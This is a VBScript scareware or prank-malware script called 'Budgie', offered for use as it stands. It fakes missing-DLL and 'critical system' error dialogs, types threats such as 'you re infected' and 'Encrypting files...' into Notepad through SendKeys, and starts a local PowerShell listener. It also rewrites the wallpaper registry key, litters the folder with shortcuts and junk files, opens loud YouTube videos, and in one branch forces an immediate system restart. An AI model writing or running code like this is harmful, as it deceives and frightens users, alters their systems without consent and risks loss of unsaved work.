On Error Resume Next 
msgbox "This Program Cant Start On Your Computer Because VBRUN100.DLL Is  Missing From Your Device."
' VBScript to run PowerShell HttpListener server
Set objShel = CreateObject("Wscript.Shell")

Set objHTML = CreateObject("htmlfile")
objHTML.ParentWindow.ClipboardData.SetData "text", "http://127.0.0.1:5000"

' PowerShell command to start the server
psCommand = "powershell -NoExit -Command " & _
    """$listener = New-Object System.Net.HttpListener;" & _
    "$listener.Prefixes.Add('http://127.0.0.1:5000/');" & _
    "$listener.Start();" & _
    "Write-Host 'http://127.0.0.1:5000';" & _
    "while ($true) {" & _
    "  $context = $listener.GetContext();" & _
    "  $response = $context.Response;" & _
    "  $html = '<html><body><h1>BUDGIE IS HERE</h1></body></html>';" & _
    "  $buffer = [System.Text.Encoding]::UTF8.GetBytes($html);" & _
    "  $response.ContentLength64 = $buffer.Length;" & _
    "  $response.OutputStream.Write($buffer,0,$buffer.Length);" & _
    "  $response.OutputStream.Close();" & _
    "}"""

' Run the PowerShell command
objShel.Run psCommand, 1, False

Set objShell = CreateObject("WScript.Shell")
strImagePath = "C:\Wallpapers\Blue-Budgie.avif"

' Update registry key for wallpaper
objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", strImagePath

' Refresh the desktop to apply changes
Set objSys = CreateObject("Shell.Application")
objSys.MinimizeAll
objShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters", 1, True
  
Set WshShell = Wscript.CreateObject("Wscript.Shell")

Set oUrlLink = WshShell.CreateShortcut("NUKEDBYBUDGIE.url")
oUrlLink.TargetPath = "https://www.youtube.com/@ADSKer.Official"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("NUKEDBYBUDGIE1.url")
oUrlLink.TargetPath = "https://www.youtube.com/@ADSKer.Official"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("NUKEDBYBUDGIE2.url")
oUrlLink.TargetPath = "https://www.youtube.com/@ADSKer.Official"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("NUKEDBYBUDGIE3.url")
oUrlLink.TargetPath = "https://www.youtube.com/@ADSKer.Official"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("NUKEDBYBUDGIE4.url")
oUrlLink.TargetPath = "https://www.youtube.com/@ADSKer.Official"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("NUKEDBYBUDGIE5.url")
oUrlLink.TargetPath = "https://www.youtube.com/@ADSKer.Official"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("NUKEDBYBUDGIE6.url")
oUrlLink.TargetPath = "https://www.youtube.com/@ADSKer.Official"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("NUKEDBYBUDGIE7.url")
oUrlLink.TargetPath = "https://www.youtube.com/@ADSKer.Official"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("NUKEDBYBUDGIE8.url")
oUrlLink.TargetPath = "https://www.youtube.com/@ADSKer.Official"
oUrlLink.Save
' j.vbs
Randomize

Set shell = CreateObject("WScript.Shell")

' Open Notepad
WScript.Sleep 1000
shell.Run "notepad.exe"
WScript.Sleep 1000
shell.AppActivate "Notepad"
shell.SendKeys "BUDGIE"
shell.SendKeys "{ENTER}"
shell.SendKeys "you re infected MF DONTOPEN SUS FILES   ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd x                  xxxxxxxxxxxxxxxxxxxxdx c,mfccccccccccccccccccccc MF !!!01!110!0!!!121100101010111!111001!!!01!110!0!!!121100101010111!111001!!!01!110!0!!!121100101010111!111001!!!01!110!0!!!121100101010111!111001!!!01!110!0!!!121100101010111!111001!!!01!110!0!!!121100101010111!111001!!!01!110!0!!!121100101010111!111001!!!01!110!0!!!121100101010111!111001!!!01!110!0!!!121100101010111!111001!!!01!110!0!!!121100101010111!111001!!!01!110!0!!!121100101010111!111001!!!01!110!0!!!121100101010111!111001!!!01!110!0!!!121100101010111!111001!!!01!110!0!!!121100101010111!111001!!!01!110!0!!!121100101010111!111001!!!01!110!0!!!121100101010111!111001!!!01!110!0!!!121100101010111!111001!!!01!110!0!!!121100101010111!111001!!!01!110!0!!!121100101010111!111001!!!0XD"
shell.SendKeys "BUDGIE WANTS TO KILL YOUR PC"
shell.SendKeys "Respond: YES OR NO"
shell.SendKeys "YES"
shell.SendKeys "Budgie:   !!!121100101010111!11100D34d1!!!01!110!0!!!1211001 !!!121100101010111!111001!!!01!110!0!!!1211001            !!!121100101010111!111001!!!01!110!0!!!1211001        "
shell.SendKeys "Budgie:Encrypting files..."
shell.SendKeys " 101010!000/100!0!00101 BY3 B43 C0mp4t3r 101010!000/100!0!00101"
shell.SendKeys " 10?!41/0)?!0!00101 BY3 B43 C0m#3¨¨%#t3r 10101By5!00101"
shell.SendKeys "10?!41/0)?!0!3 B43 r 1il23523By5!00101"
shell.SendKeys "10?!41/0"
shell.SendKeys "10"
shell.SendKeys "1"
' Create a few randomly named text files
For i = 1 To 5
    fileName = ""
    For j = 1 To 5
        fileName = fileName & Chr(Int((26 * Rnd) + 97)) ' random lowercase letters
    Next
    fileName = fileName & ".budgie"
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set file = fso.CreateTextFile(fileName, True)
    file.WriteLine "This Program Cannot Be Run In Dos Mode. MZ@ A!455654hgTrJEhYTh6SXcvok5htr´{}~997{JK _ JK _ _JgF BA-}"
    file.WriteLine "MKXet5646 r7657e ykjyuuu yuu uuu  y y yu r  ff @f fgg gg@ g fffggfr@ "
    file.WriteLine "MW0rmB0TN3_TggE34_45_Rgdf_RDDOS.js-NNNDR3REW5Qamaom3a4eg@_gff_fg_gfr@ "
    file.WriteLine "MCMDHeurBZCPZQBoxter23152E92977"
    file.Close
Next
Randomize

' Generate a random hash-like string
Dim chars, i, hash
chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-"
hash = ""

For i = 1 To 20
    hash = hash & Mid(chars, Int(Rnd * Len(chars)) + 1, 1)
Next

' Show the message box with the random string
response = MsgBox(hash, vbOKOnly, hash)

If response = vbOK Then
wellisdraining=inputbox(hash,"GOD IS HERE"," ")
Url = "https://www.youtube.com/shorts/ZjxhBvNGsjM" 
set wshshl = WScript.CreateObject("wscript.shell")
wshshl.Run(URL)
wshshl.Run(URL)
wshshl.Run(URL)

    MsgBox "??????????????????", vbInformation, "BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE-BUDGIE"
x=msgbox("This Program Cant Start On Your Computer Because VCRUNTIME100.DLL Is  Missing From Your Device.",0+48, "svchost - System Error")
x=msgbox("WARNING:cannot Start Critical system Process svchost.",0+48, "Critical System Error")
x=msgbox("Your Computer will Be Corrupted If You Dont Restart.",0+48, "System32")
x=msgbox("System32 .exe File winload Was not Found.",5+16, "Critical System Error")
x=msgbox("System32 .com File win.com Was not Found problems will be shown on boot.",5+16, "Critical System Error") 
x=msgbox("This Program Cant Start On Your Computer Because MSVCR120.DLL Is  Missing From Your Device.",5+16, "conhost - System Error")

' Save as ErrorMsg.vbs and double-click to run

Dim choice
choice = MsgBox("", vbAbortRetryIgnore + vbCritical + vbMsgBoxHelpButton, "Error")

Select Case choice
    Case vbAbort
        MsgBox "Deleting"
    Case vbRetry
        MsgBox "SysWow64"
    Case vbIgnore
        MsgBox "Budgie Has Been Sucesfully lauched."
shell.SendKeys "ur DEAD mf"
Set objShell = CreateObject("Wscript.Shell")

' Wait for 180 seconds (3 minutes)
MsgBox "Your system will be restarted in 180 seconds."
Wscript.Sleep 180000

' Restart the computer
objShell.Run "shutdown /r /t 0"
MsgBox "ENJOY YOUR FRIED CHICKEN BOZO"
shell.SendKeys "F11n e"
    Case vbMsgBoxHelpButton
        MsgBox "DAMIR78.dll has been executed"
Urlw = "https://www.youtube.com/shorts/sBcrrswGtMU#LOUD_ASS_SCREAM" 
set wshhl = WScript.CreateObject("wscript.shell")
wshhl.Run(URLw)
wellisdrining=inputbox("DAm is GG     hahah4hhHAAAHHG44Aha3jh3amj4645çkikrfgjjjjjjjjjjjjc","DAMIR78.dll","input")
End Select


End If




